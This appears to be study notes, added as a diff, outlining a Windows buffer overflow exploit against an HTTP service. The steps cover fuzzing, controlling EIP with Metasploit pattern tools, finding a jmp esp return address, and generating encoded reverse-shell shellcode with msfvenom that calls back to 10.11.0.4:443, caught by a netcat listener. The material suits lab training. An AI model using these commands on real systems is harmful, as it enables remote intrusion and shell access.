@@ -1,1 +1,50 @@
+Fuzzing the HTTP Protocol 
+
+./fuzzer.py
+
+
+
+
+Controlling EIP
+
+locate pattern_create
+msf-pattern_create -h
+msf-pattern_create -l 800
+msf-pattern_offset -l 800 -q 42306142
+
+
+
+Finding a Return Address
+
+ msf-nasm_shell
+ jmp esp
+ 
+ 
+ 
+ 
+Generating Shellcode with Metasploit
+ 
+msfvenom -l payloads
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
+ 
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e
+x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
+
+
+
+Getting a Shell
+
+sudo nc -lnvp 443
+whoami
+
+
+
+
+Improving the Exploit
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443
+EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
 
